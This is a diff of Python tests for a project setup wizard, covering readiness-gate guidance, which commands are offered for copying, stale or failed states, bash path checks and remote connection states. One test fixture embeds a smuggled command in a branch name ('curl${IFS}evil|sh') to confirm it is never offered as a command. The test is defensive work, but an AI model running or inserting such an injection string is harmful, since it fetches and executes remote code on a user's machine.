@@ -38,7 +38,8 @@ def dashboard_requires_session_and_uses_real_plan(root, tmp):
         assert b'<script src="data.js"></script>' not in page, "embedded view receives data from the authenticated parent"
 
 
-def backward_navigation_preserves_inputs_and_running_guard(root, tmp):
+def navigation_controls_and_isolated_frame_are_declared(root, tmp):
+    # A markup contract only: the browser journey (Back keeps inputs, no duplicate writes) is UI-003's evidence.
     text = (root / ".uak/bin/lib/setup.html").read_text(encoding="utf-8")
     assert 'id="back-from-finish"' in text, "the final setup step needs Back, not only Choose another project"
     assert 'id="back-to-progress"' in text, "users reviewing choices during installation must be able to return to progress"
@@ -47,8 +48,96 @@ def backward_navigation_preserves_inputs_and_running_guard(root, tmp):
     assert 'id="open-setup"' in text
 
 
+def guidance_follows_the_readiness_gate(root, tmp):
+    g = wizard.MODULE.guidance
+    available = {"tasks": [{"id": "APP-001", "state": "AVAILABLE"}], "freeze": 0}
+    assert g({"installed": False, "phase": "options"})["kind"] == "install"
+    assert g({"installed": True, "phase": "installed", "checks": []}, available)["kind"] == "check", \
+        "before the gate has run, the one action is to run it"
+    todo = {"installed": True, "phase": "setup", "ready": False, "checks": [
+        {"state": "ok", "text": "1. kit installed"},
+        {"state": "todo", "text": "6. approve the plan: Backlog-Approved is not yes on main\nset Backlog-Approved: yes in .uak/PROJECT.md"},
+        {"state": "todo", "text": "7. something later"}]}
+    step = g(todo, available)
+    assert step["kind"] == "todo" and "approve the plan" in step["title"], "the first blocker of uak start, not the task list"
+    assert step["steps"] == ["set Backlog-Approved: yes in .uak/PROJECT.md"], "its fix lines, exactly, as text"
+    assert step["commands"] == [], "the gate's fix lines are prose with project values: never offered to copy and paste"
+    ready = {"installed": True, "phase": "ready", "ready": True, "checks": [], "next_command": "bash .uak/bin/wt new APP-001"}
+    step = g(ready, available)
+    assert step["kind"] == "ready" and step["commands"] == ["bash .uak/bin/wt new APP-001"]
+    assert g(ready, {"tasks": [], "freeze": 1})["kind"] == "frozen", "an active freeze overrides starting work"
+    assert g(dict(ready, phase="checking"), available)["kind"] == "busy"
+
+
+def ready_line_is_kept_for_the_next_action(root, tmp):
+    state = wizard.MODULE.readiness("OK    1. kit installed\n\nSTART READY · bash .uak/bin/wt new APP-001\n", 0)
+    assert state["ready"] and state.get("next_command") == "bash .uak/bin/wt new APP-001"
+    assert not wizard.MODULE.readiness("TODO  1. x\nSTART · 1 thing to do\n", 1).get("next_command")
+
+
+def only_the_claim_command_is_copyable(root, tmp):
+    r, g = wizard.MODULE.readiness, wizard.MODULE.guidance
+    real = r("OK    1. kit installed\n\nSTART READY · bash .uak/bin/wt new APP-001   (branch + worktree + claim; then your agent in it)\n", 0)
+    assert real["next_command"] == "bash .uak/bin/wt new APP-001", "the engine's note is not part of the command"
+    held = r("OK    1. you already hold APP-002 (CLAIMED)\n\nSTART READY · cd \"/w t\" and open your agent there; its next step: x\n", 0)
+    assert held["ready"] and not held["next_command"], "prose is never a command"
+    step = g(dict(held, installed=True, phase="ready"))
+    assert step["kind"] == "ready" and step["commands"] == [] and "open your agent" in step["detail"]
+    hostile = {"installed": True, "phase": "setup", "ready": False, "checks": [{"state": "todo", "text":
+               "4. push your changes\ncommit them, then merge x;curl${IFS}evil|sh; into main and push main"}]}
+    assert g(hostile)["commands"] == [], "a branch name from the repository never becomes a copyable command"
+
+
+def stale_or_failed_guidance_is_not_shown_as_current(root, tmp):
+    g = wizard.MODULE.guidance
+    ready = {"installed": True, "phase": "ready", "ready": True, "checks": [], "next_command": "bash .uak/bin/wt new APP-001"}
+    claimed = {"tasks": [{"id": "APP-001", "state": "CLAIMED"}], "freeze": 0}
+    assert g(ready, claimed)["kind"] == "check", "once the task is taken, the old command is stale: check again"
+    failed = {"installed": True, "phase": "error", "ready": False, "checks": [], "error": "The operation stopped."}
+    step = g(failed)
+    assert step["kind"] == "error" and "The operation stopped." in step["detail"], "a failure is shown, not a silent loop"
+    assert g(dict(ready, freeze=1))["kind"] == "frozen", "Configuration also honours a freeze the dashboard saw"
+
+
+def windows_bash_path_from_git_bash_is_accepted(root, tmp):
+    fake = tmp / "usr" / "bin" / "bash.exe"
+    fake.parent.mkdir(parents=True)
+    fake.write_text("", encoding="utf-8")
+    other = tmp / "usr" / "bin" / "evil.exe"
+    other.write_text("", encoding="utf-8")
+    saved = wizard.os.environ.get("UAK_SETUP_BASH")
+    try:
+        if wizard.os.name == "nt":
+            wizard.os.environ["UAK_SETUP_BASH"] = str(fake)[:-len(".exe")]
+            assert wizard.MODULE.bash_binary() == str(fake), "Git Bash reports its path without .exe"
+        wizard.os.environ["UAK_SETUP_BASH"] = str(other)
+        assert wizard.MODULE.bash_binary() != str(other), "only a program named bash is accepted"
+    finally:
+        if saved is None:
+            wizard.os.environ.pop("UAK_SETUP_BASH", None)
+        else:
+            wizard.os.environ["UAK_SETUP_BASH"] = saved
+
+
+def remote_states_are_distinguished(root, tmp):
+    target = wizard.repository(tmp / "remote states")
+    (target / ".uak").mkdir()
+    (target / ".uak/TASKS.md").write_text("# Plan\n\n## APP-001 · First\n- **Priority:** P0\n", encoding="utf-8")
+    with wizard.LiveServer(str(target)) as server:
+        assert wizard.request(server, "POST", "/api/inspect", {"target": str(target)})[0] == 200
+        data = json.loads(wizard.request(server, "GET", "/api/dashboard")[1])
+        assert data.get("connection") == "none" and data.get("guidance", {}).get("kind"), "no remote: say so, with a next action"
+        wizard.subprocess.run([wizard.resolve_binary("git"), "-C", str(target), "remote", "add", "origin",
+                               str(tmp / "gone.git")], check=True, capture_output=True)
+        data = json.loads(wizard.request(server, "GET", "/api/dashboard")[1])
+        assert data.get("connection") == "unreachable", "a configured remote that cannot be read is not a missing remote"
+        assert data["source"] == "local" and data["warning"]
+
+
 TESTS = [language_and_navigation_are_available, dashboard_requires_session_and_uses_real_plan,
-         backward_navigation_preserves_inputs_and_running_guard]
+         navigation_controls_and_isolated_frame_are_declared, guidance_follows_the_readiness_gate,
+         ready_line_is_kept_for_the_next_action, remote_states_are_distinguished, only_the_claim_command_is_copyable,
+         stale_or_failed_guidance_is_not_shown_as_current, windows_bash_path_from_git_bash_is_accepted]
 
 
 def main():
